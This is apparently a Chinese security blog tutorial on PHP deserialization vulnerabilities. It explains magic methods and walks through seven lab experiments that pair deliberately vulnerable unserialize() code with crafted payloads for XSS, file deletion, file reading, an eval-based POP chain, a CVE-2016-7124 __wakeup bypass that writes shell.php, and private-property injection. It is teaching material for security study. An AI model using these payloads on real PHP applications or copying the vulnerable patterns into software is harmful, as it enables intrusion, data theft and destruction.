@@ -1,0 +1,1378 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="反序列化,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="soliym" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="序列化与反序列化序列化：把变量转换为课存储或课传输文本结构的过程 反序列化：在合适的时候把序列化后的文本结构转化为原来的变量 将变量对象持久化操作，让其离开内存保存在硬盘中，等到需要的时候，在从硬盘中加载变量对象到内存中，这样就可以大大节约内存地址 意义：序列化和反序列的结合可以轻松的存储和传输数据，我们可以把对象序列化为不同的格式，json、XML、二进制、SOAP等">
+<meta name="keywords" content="反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化原理与实例讲解">
+<meta property="og:url" content="http://soliym.top/2021/06/19/反序列化原理与实例讲解/index.html">
+<meta property="og:site_name" content="soliym">
+<meta property="og:description" content="序列化与反序列化序列化：把变量转换为课存储或课传输文本结构的过程 反序列化：在合适的时候把序列化后的文本结构转化为原来的变量 将变量对象持久化操作，让其离开内存保存在硬盘中，等到需要的时候，在从硬盘中加载变量对象到内存中，这样就可以大大节约内存地址 意义：序列化和反序列的结合可以轻松的存储和传输数据，我们可以把对象序列化为不同的格式，json、XML、二进制、SOAP等">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-05-18T08:12:03.268Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="反序列化原理与实例讲解">
+<meta name="twitter:description" content="序列化与反序列化序列化：把变量转换为课存储或课传输文本结构的过程 反序列化：在合适的时候把序列化后的文本结构转化为原来的变量 将变量对象持久化操作，让其离开内存保存在硬盘中，等到需要的时候，在从硬盘中加载变量对象到内存中，这样就可以大大节约内存地址 意义：序列化和反序列的结合可以轻松的存储和传输数据，我们可以把对象序列化为不同的格式，json、XML、二进制、SOAP等">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://soliym.top/2021/06/19/反序列化原理与实例讲解/">
+
+
+
+
+
+  <title>反序列化原理与实例讲解 | soliym</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">soliym</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://soliym.top/2021/06/19/反序列化原理与实例讲解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="soliym">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="soliym">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">反序列化原理与实例讲解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-19T22:37:21+08:00">
+                2021-06-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h5 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h5><p>序列化：把变量转换为课存储或课传输文本结构的过程</p>
+<p>反序列化：在合适的时候把序列化后的文本结构转化为原来的变量</p>
+<p>将变量对象持久化操作，让其离开内存保存在硬盘中，等到需要的时候，在从硬盘中加载变量对象到内存中，这样就可以大大节约内存地址</p>
+<p>意义：序列化和反序列的结合可以轻松的存储和传输数据，我们可以把对象序列化为不同的格式，json、XML、二进制、SOAP等</p>
+<a id="more"></a>
+<h5 id="使用序列化"><a href="#使用序列化" class="headerlink" title="使用序列化"></a>使用序列化</h5><p>1、将内存中的类写入文件或者数据库中</p>
+<p>2、递归保存对象引用的每一个对象数据</p>
+<p>3、分布式对象</p>
+<p>4、同一对文件、对象、数据保存和传输</p>
+<h5 id="PHP的序列化和反序列化"><a href="#PHP的序列化和反序列化" class="headerlink" title="PHP的序列化和反序列化"></a>PHP的序列化和反序列化</h5><p>PHP在序列化的函数为Serialize，将对象转换为字符串保存对象中的变量及变量值</p>
+<p>php序列化一个对象会保存类型，对象的所有变量及值，但是不会保存方法</p>
+<p>PHP的反序列化函数为unseralize，将序列化后的字符串转换为对象</p>
+<h5 id="PHP的魔法函数"><a href="#PHP的魔法函数" class="headerlink" title="PHP的魔法函数"></a>PHP的魔法函数</h5><p>__construct() //当⼀个对象创建时被调⽤ </p>
+<p>__destruct() //当对象被销毁是触发 </p>
+<p>__wakeup() //使⽤unserialize触发 </p>
+<p>__sleep() //使⽤serialize触发 </p>
+<p>__toString() //把类当做字符串使⽤时触发 </p>
+<p>__call() //在对象上下⽂中调⽤不可访问的⽅法时触发 </p>
+<p>__callStatic //在静态上下⽂中调⽤不可访问的⽅法时触发 </p>
+<p>__get() //⽤于从不可访问的属性读取数据 </p>
+<p>__set() //⽤于将数据写⼊不可访问的属性 </p>
+<p>__isset() //在不可访问的属性上调⽤isset()或者empty()触发 </p>
+<p>__unset() //在不可访问的属性上使⽤unset()是触发 </p>
+<p>__invoke() //当脚本尝试将对象⽤为函数时触发</p>
+<p>由于序列化中不会传递方法，对象中的自定义函数我们没有办法直接利用，但是魔法函数是可以自动执行的，当类中调用了魔法函数时，魔法函数又自动触发执行的特点</p>
+<h5 id="反序列化漏洞实验"><a href="#反序列化漏洞实验" class="headerlink" title="反序列化漏洞实验"></a>反序列化漏洞实验</h5><p>PHP反序列化漏洞，是在我们使⽤ unserialize() 进⾏反序列化的时候，如果反序列化对象中存在⼀ </p>
+<p>些我们可以利⽤的魔法函数且传⼊的变量可控，那么就可能触发这个魔法函数，来执⾏我们想要的过 </p>
+<p>程。</p>
+<h6 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h6><p>搭建PHP页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class dome </span><br><span class="line">&#123; </span><br><span class="line">public $a=&apos;dome&apos;; </span><br><span class="line">function __destruct() </span><br><span class="line">&#123; </span><br><span class="line">echo $this-&gt;a; </span><br><span class="line">echo &apos;&lt;/br&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$ob= new dome(); </span><br><span class="line">echo serialize($ob).&apos;&lt;/br&gt;&apos;; </span><br><span class="line">$test= $_GET[&apos;id&apos;] ; </span><br><span class="line">unserialize($test); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过浏览器访问该页面</p>
+<p>在url中构造注入参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/demo.php?id=O:4:%22dome%22:1:&#123;s:1:%22a%22;s:4:%221234%22;&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：页面会显示我们输入的参数“1234”</p>
+<p>但是有一个问题是？为什么输出的顺序的1234在前呢</p>
+<p>当代码被执行的时候是从上往下的，首先会从类的创建开始，类被创建完毕后，会输出序列化后的对象，这就是第一行的输出，然后test从页面接受名为id的参数，然后反序列化为一个对象，我们注入的是一个名为dome的类，并且变量a的值为1234。__destruct魔法函数，是在对象被销毁时，触发的，什么时候对象会被销毁呢？当然是页面执行完毕的时候，所以反序列化函数先被销毁，所以先输出了1234，然后ob对象再被销毁</p>
+<p>序列化参数解析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;dome&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;dome&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>上述是PHP序列化后输出的内容，它的内容构造如下：</p>
+<p>O：表示object</p>
+<p>4：表示类名的长度</p>
+<p>“dome”：表示类名</p>
+<p>1：表示类下有几个参数</p>
+<p>花括号内表示变量名及参数</p>
+<p>s：表示string</p>
+<p>1：表示变量名长度</p>
+<p>​     “a”：表示变量名</p>
+<p>实验的另一种玩法：注入xss漏洞</p>
+<p>因为我们输入的东西会显示在页面上，所以我们可以注入xss</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/demo.php?id=O:4:%22dome%22:1:&#123;s:1:%22a%22;s:25:%22%3Cscript%3Ealert(1)%3C/script%3E%22;&#125;</span><br></pre></td></tr></table></figure>
+<h6 id="实验二："><a href="#实验二：" class="headerlink" title="实验二："></a>实验二：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class delete </span><br><span class="line">&#123; </span><br><span class="line">public $filename = &apos;error&apos;; </span><br><span class="line">function __destruct() </span><br><span class="line">&#123; </span><br><span class="line">echo $this-&gt;filename.&quot; was deleted.&lt;/br&gt;&quot;; </span><br><span class="line">//uplink函数是删除⽂件，dirname函数输出路径； </span><br><span class="line">unlink(dirname(__FILE__).&apos;/&apos;.$this-&gt;filename); </span><br><span class="line">&#125; &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码中有魔法函数，但是没有反序列化函数，也没有注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &apos;2.php&apos;; </span><br><span class="line">class student </span><br><span class="line">&#123; </span><br><span class="line">public $name=&apos;&apos;; </span><br><span class="line">public $age=&apos;&apos;; </span><br><span class="line">public function information() </span><br><span class="line">&#123; </span><br><span class="line">echo &apos;student: &apos;.$this-&gt;name.&apos; is &apos;.$this-&gt;age.&apos;years old.&lt;/br&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$zs=unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码中没有魔法函数，但是有反序列化函数，也有注入点</p>
+<p>因为3.php中有包括2.php，所以我们就可以看成一个代码程序，这样2就有注入点和反序列化函数了</p>
+<p>创建2和3的php页面，然后再创建一个a.txt文件</p>
+<p>通过浏览器访问3.php，然后构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">O:6:&quot;delete&quot;:1:&#123;s:8:&quot;filename&quot;;s:5:&quot;a.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>执行后，会在页面显示a.txt被删除，然后在根目录下查看文件是否存在，如果没有，那么反序列化漏洞就执行成功</p>
+<p>总结：通过上述实验，可以得到反序列化漏洞的条件</p>
+<p>1、魔法函数</p>
+<p>2、反序列化函数</p>
+<p>3、web注入点</p>
+<h6 id="实验三："><a href="#实验三：" class="headerlink" title="实验三："></a>实验三：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class read </span><br><span class="line">&#123; </span><br><span class="line">public $filename = &apos;error&apos; ;</span><br><span class="line">function __toString() </span><br><span class="line">&#123; </span><br><span class="line">//file_get_contents()函数是把⽂件内容赋予⼀个变量 </span><br><span class="line">return file_get_contents($this-&gt;filename); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>该页面中，没有反序列化函数，没有注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//5.php </span><br><span class="line">&lt;?php </span><br><span class="line">include &apos;4.php&apos;; </span><br><span class="line">class student </span><br><span class="line">&#123; </span><br><span class="line">public $name=&apos;&apos;; </span><br><span class="line">public $age=&apos;&apos;; </span><br><span class="line">public function information() </span><br><span class="line">&#123; </span><br><span class="line">echo &apos;student: &apos;.$this-&gt;name.&apos; is &apos;.$this-&gt;age.&apos;years old.&lt;/br&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$zs=unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">echo $zs; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>该页面中有反序列化函数，有注入点</p>
+<p>与上一个实验相似，这个也是两个页面结合的，但是使用的魔法函数不同,操作方法一样</p>
+<p>创建这两个页面，然后再创建一个a.txt文件，在这个文件中写入一些数据</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/5.php?id=O:4:%22read%22:1:&#123;s:8:%22filename%22;s:5:%22a.txt%22;&#125;</span><br></pre></td></tr></table></figure>
+<p>页面就会显示a.txt的数据了，它的原理和方法与上一实验是一样的，要注意的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $zs;</span><br></pre></td></tr></table></figure>
+<p>这行代码是触发的关键，__tostring魔法函数是当做字符串时，触发的，echo输出的就是字符串，所以会被触发</p>
+<h6 id="实验四："><a href="#实验四：" class="headerlink" title="实验四："></a>实验四：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class a&#123; </span><br><span class="line">public $varr; </span><br><span class="line">function __destruct()&#123; </span><br><span class="line">$this-&gt;varr-&gt;evaltest(); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">class b&#123; </span><br><span class="line">public $str; </span><br><span class="line">function evaltest()&#123; </span><br><span class="line">eval($this-&gt;str); //危险函数 </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$obj= new a(); </span><br><span class="line">unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码中魔法函数，反序列化，注入点都有，但是在魔法函数中，有一段代码很有问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;varr-&gt;evaltest();</span><br></pre></td></tr></table></figure>
+<p>这段代码调用了b中的evaltest函数，一般来说这样是不可以的，如果要调用，必须是varr是一个类b的对象，如果我们要触发这个函数，就要将varr构造为b的对象</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:1:&#123;s:4:&quot;varr&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>这是一般的构造，但是varr的值不再是一个字符串，而是一个对象，所以要将对象加入到payload中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:1:&#123;s:4:&quot;varr&quot;;O:1:&quot;b&quot;:1:&#123;s:3:&quot;str&quot;;s:10:&quot;phpinfo();&quot;;&#125;;&#125;</span><br></pre></td></tr></table></figure>
+<p>在原有的payload的基础上，将varr的变量值替换为一个b的对象</p>
+<p>反序列化后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class a&#123; </span><br><span class="line">public $varr= &apos;new b()&apos;; </span><br><span class="line">&#125; </span><br><span class="line">class b&#123; </span><br><span class="line">public $str=&apos;phpinfo();&apos;; </span><br><span class="line">&#125; </span><br><span class="line">$x = new a();</span><br></pre></td></tr></table></figure>
+<h6 id="实验五："><a href="#实验五：" class="headerlink" title="实验五："></a>实验五：</h6><p>wakeup() 魔法函数 </p>
+<p>在unserialize()执⾏时会检测是否存在wakeup()⽅法，如果存在会先调⽤wakeup()⽅法作为预先准 </p>
+<p>备对象需要的资源，经常⽤于执⾏⼀些初始化操作，或者重新建⽴数据库连接等场景。 </p>
+<p>CVE-2016-7124 漏洞 php5&lt;5.6.25;php7&lt;7.0.10中出现，该漏洞会在序列化字符串时，对象的属 </p>
+<p>性个数的值⼤于真实的属性个数值时会跳过wakeup()⽅执⾏。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class wakeup_bug&#123;</span><br><span class="line"> public $a=&apos;wakeup&apos;;</span><br><span class="line"> function __destruct()&#123;</span><br><span class="line"> echo &apos;I am not &apos;.$this-&gt;a;</span><br><span class="line"> &#125;</span><br><span class="line"> function __wakeup()&#123;</span><br><span class="line"> echo &apos;I am &apos;.$this-&gt;a；</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&apos;id&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/7.php?id=O:10:%22wakeup_bug%22:1:&#123;s:1:%22a%22;s:3:%22123%22;&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><strong>destruct()和</strong>wakeup()函数都会执行</p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/7.php?id=O:10:%22wakeup_bug%22:2:&#123;s:1:%22a%22;s:3:%22123%22;&#125;</span><br></pre></td></tr></table></figure>
+<p>如果属性的参数是两个时，就会跳过__wakeup函数</p>
+<h6 id="实验六："><a href="#实验六：" class="headerlink" title="实验六："></a>实验六：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class a&#123; </span><br><span class="line">var $a = &quot;test&quot;; </span><br><span class="line">function __destruct()&#123; </span><br><span class="line">$fp = fopen(&quot;shell.php&quot;,&quot;w+&quot;); </span><br><span class="line">fputs($fp,$this-&gt;a); </span><br><span class="line">fclose($fp); </span><br><span class="line">&#125; </span><br><span class="line">function __wakeup() </span><br><span class="line">&#123; </span><br><span class="line">//清空$a的值 </span><br><span class="line">foreach(get_object_vars($this) as $b =&gt; $c) &#123; </span><br><span class="line">$this-&gt;$b = null; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>代码分析：</p>
+<p>魔法函数<strong>destruct()会将变量a的值保存到shell.php文件，</strong>wakeup函数会将变量a的值清空，因为wakeup函数是先与destruct函数执行的，所以我们输入的所有内容都是无效的，因此我们要绕过wakeup函数，绕过方法前面已经演示了</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>在根目录下查看结果，会有一个shell.php存放我们输入的数据</p>
+<h6 id="实验七："><a href="#实验七：" class="headerlink" title="实验七："></a>实验七：</h6><p>private、protected属性外部修改 </p>
+<p>public属性可以被外部修改⽽private、protected属性⽆法被对象外部修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class student </span><br><span class="line">&#123; </span><br><span class="line">public $name=&apos;xxx&apos;; </span><br><span class="line">private $age=&apos;xxx&apos;; </span><br><span class="line">protected $sex=&apos;xxx&apos;; </span><br><span class="line">function __toString() </span><br><span class="line">&#123; </span><br><span class="line">return &apos;name: &apos;.$this-&gt;name.&apos;&lt;br&gt;age: &apos;.$this-&gt;age&apos;&lt;/br&gt;sex: &apos;.$this- </span><br><span class="line">&gt;sex&apos;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$s1 = new student(); </span><br><span class="line">echo $s1.&apos;&lt;/br&gt;&apos;; </span><br><span class="line">echo serialize($s1); </span><br><span class="line">$zs=unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">echo $zs; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>private 属性序列化格式为 <0x00>对象名<0x00>属性名 </0x00></0x00></p>
+<p>public 属性没有变化 </p>
+<p>protected 属性序列化格式为<0x00>*<0x00>属性名 </0x00></0x00></p>
+<p>需要从外部改变属性值需要把<0x00>替换为%00 %00算作⼀个字符</0x00></p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/9.php?id=O:7:%22student%22:3:&#123;s:4:%22name%22;s:3:%22yyy%22;s:12:%22%00student%00age%22;s:3:%22yyy%22;s:6:%22%00*%00sex%22;s:3:%22yyy%22;&#125;</span><br></pre></td></tr></table></figure>
